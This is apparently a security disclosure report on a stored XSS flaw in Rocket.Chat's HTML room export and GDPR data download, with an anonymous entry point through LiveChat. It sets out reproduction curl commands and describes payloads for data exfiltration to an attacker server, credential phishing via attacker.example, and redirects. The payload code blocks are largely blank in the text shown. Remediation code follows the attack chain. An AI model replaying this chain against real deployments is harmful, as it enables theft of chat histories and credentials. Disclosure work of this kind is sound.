title: Stored XSS in Rocket.Chat HTML File Export — Unauthenticated Entry via LiveChat

profile.name: Rocket.Chat
profile.about: Rocket.Chat is a company built on open source values and a love for efficiency. The company is driven by our amazing community of contributors.

vulnerability_information:
--- ## Summary Rocket.Chat's HTML file export feature (`rooms.export` API, `type=file`, `format=html`) writes message content and metadata directly into HTML output without any sanitization or entity encoding. An attacker — including an **unauthenticated** LiveChat visitor — can inject arbitrary JavaScript that executes when anyone exports the conversation and opens the resulting HTML file. The same vulnerable code path is shared by the GDPR "Download My Data" feature, meaning a single malicious message in a shared channel poisons the personal data export of every channel member. --- ## Root Cause File: `apps/meteor/server/lib/dataExport/exportRoomMessagesToFile.ts`, function `exportMessageObject()`: ```typescript const message = italicTypes.includes(messageType) ? `${messageObject.msg}` : messageObject.msg; file.push(`

${messageObject.username} (${timestamp}):
`); file.push(message); ``` `messageObject.msg` is inserted raw into the HTML. No `escapeHTML()`, no entity encoding, no sanitization. The generated HTML has no CSP meta tag. For contrast, the notification email path in the **same codebase** (`apps/meteor/app/lib/server/functions/notifications/email.js`) correctly applies `escapeHTML()` to all user-controlled fields — proving the developer was aware of the need for escaping but omitted it from the export path. --- ## Attack Chain ### Entry: Anonymous LiveChat Visitor (No Authentication) ``` POST /api/v1/livechat/visitor — no auth, no CAPTCHA POST /api/v1/livechat/message — no auth, only visitor token ``` The visitor `name` field and `msg` field accept arbitrary strings with zero validation. HTML/JS tags are stored as-is in the database. ### Delivery The malicious message persists in the `rocketchat_message` collection. It enters the export via two paths: 1. **Room export** (`rooms.export` API) — admin/moderator exports a channel or LiveChat conversation as HTML 2. **GDPR data download** (`users.requestDataDownload`) — any user requests their personal data, which generates HTML files for all rooms they participate in. A cron job (`userDataDownloadsCron`) processes the request every ~2 minutes. ### Trigger The victim downloads the exported ZIP archive, extracts it, and opens the HTML file in a browser. JavaScript executes in the `file://` context. ## Proof of Concept ### Environment - Rocket.Chat 6.3.12 (Docker: `rocket.chat:6.3`) - MongoDB 6.0 with replica set - No email server configured (export files retrieved from container `/tmp/`) ### Steps to Reproduce **Step 1 — Register anonymous LiveChat visitor:** ```bash curl -X POST http://TARGET:3000/api/v1/livechat/visitor \ -H 'Content-Type: application/json' \ -d '{"visitor":{"name":"Customer","email":"test@test.com","token":"poc-token-001"}}' ``` **Step 2 — Create LiveChat room (requires an agent to be online):** ```bash curl http://TARGET:3000/api/v1/livechat/room?token=poc-token-001 # Returns: {"room":{"_id":"ROOM_ID",...}} ``` **Step 3 — Send XSS payload as anonymous visitor:** ```bash curl -X POST http://TARGET:3000/api/v1/livechat/message \ -H 'Content-Type: application/json' \ -d '{ "token":"poc-token-001", "rid":"ROOM_ID", "msg":"" }' ``` No authentication headers required at any step. **Step 4 — Export the LiveChat room as HTML (as agent/admin):** ```bash curl -X POST http://TARGET:3000/api/v1/rooms.export \ -H 'X-Auth-Token: ADMIN_TOKEN' \ -H 'X-User-Id: ADMIN_UID' \ -H 'Content-Type: application/json' \ -d '{"rid":"ROOM_ID","type":"file","format":"html","dateFrom":"2020-01-01","dateTo":"2030-01-01"}' ``` **Step 5 — Open the exported HTML file in a browser.** ### Result The exported HTML contains the raw, unescaped XSS payload: ```html

guest-2 (Wed, 03 Jun 2026 13:23:22 GMT):

``` The `` handler fires immediately on page load. The full text content of the export (all messages in the conversation) is base64-encoded and sent to the attacker's server. ### Artifacts All PoC files are in the `poc/rocketchat/` directory: | File | Description | |------|-------------| | `docker-compose.yml` | Rocket.Chat + MongoDB infrastructure | | `poc_full.py` | Automated PoC: register users, send payloads, trigger export | | `GENERAL_export_live.html` | Exported HTML with raw XSS payloads (from live Docker instance) | | `cors_test.html` | CORS boundary verification | | `file_cookie_test.html` | Cookie isolation verification (`file://` origin) | --- ## Affected Paths | Path | Auth Required | Format | Escaping | Status | |------|--------------|--------|----------|--------| | `rooms.export` (type=file, format=html) | Admin / `export-room` perm | HTML file | **NONE** | **VULNERABLE** | | `users.requestDataDownload` (GDPR) | Any authenticated user | HTML file in ZIP | **NONE** | **VULNERABLE** | | `sendViaEmail.ts` (type=email) | `mail-messages` perm | HTML email body | `Message.parse()` for msg, **NONE for username** | **PARTIALLY VULNERABLE** | | `sendTranscript.ts` (LiveChat) | Agent | HTML email body | `escapeHtml()` applied | Not vulnerable | | `notifications/email.js` | System | HTML email body | `escapeHTML()` applied | Not vulnerable | The inconsistency between the export paths (no escaping) and the notification/transcript paths (proper escaping) in the same codebase confirms this is an oversight, not a design decision. --- ## Boundaries / Honest Scope **What this IS:** - Stored XSS with anonymous entry via LiveChat - Data exfiltration of export contents (privilege escalation on data level) - Credential phishing with no browser security indicators - Affects every Rocket.Chat deployment with LiveChat enabled (default: enabled) **What this is NOT:** - Not a direct API takeover or RCE from the export context. The exported HTML opens in `file://` origin, which cannot access Rocket.Chat's cookies, localStorage, or make authenticated API calls due to origin isolation. - Not zero-click. Requires the victim to: (1) export the room, (2) download the ZIP, (3) open the HTML file. Three user actions. - Cookie sharing across `localhost` ports is a development-environment artifact (RFC 6265 port-agnostic cookies), not exploitable in production deployments where the export is opened from `file://`. --- ## Remediation **Immediate fix (one-line per sink):** Apply `escapeHTML()` to all user-controlled fields in `exportRoomMessagesToFile.ts`: ```typescript // Before: file.push(`

${messageObject.username} (${timestamp}):
`); file.push(message); // After: import { escapeHTML } from '@rocket.chat/string-helpers'; file.push(`

${escapeHTML(messageObject.username)} (${escapeHTML(timestamp)}):
`); file.push(escapeHTML(message)); ``` **Defense in depth:** Add a CSP meta tag to the exported HTML header: ```html ``` This blocks script execution, external resource loading, and form submissions even if a new unescaped field is introduced in the future. **Same fix for `sendViaEmail.ts`:** Escape `message.u.username` in the email template. --- ## Impact --- ## Impact ### 1. Data Exfiltration (Privilege Escalation on Data Level) The XSS payload reads the contents of the exported HTML file — which contains the **full channel history** — and exfiltrates it to an attacker-controlled server: ```html ``` This constitutes a privilege escalation: the attacker gains access to messages sent **before they joined the channel**, and (via the GDPR export path) potentially to messages from **channels they were never a member of**, since the victim's export contains all their rooms. **Scenario:** An anonymous LiveChat visitor sends an XSS payload. A support agent exports the conversation. The exported HTML also contains internal notes, other agents' messages, and system events from the LiveChat room — data the visitor should never see. ### 2. Credential Phishing The XSS replaces the export content with a convincing Rocket.Chat login form that submits credentials to the attacker: ```html ``` The victim sees a branded Rocket.Chat login page. They enter their admin credentials believing their session expired. The credentials are sent to the attacker. **Note:** because the export runs in `file://` context, there are no browser security indicators (no URL bar showing `attacker.example`, no certificate warnings). The phishing form is indistinguishable from a legitimate prompt. ### 3. Redirect to Malicious Content ```html ``` ---
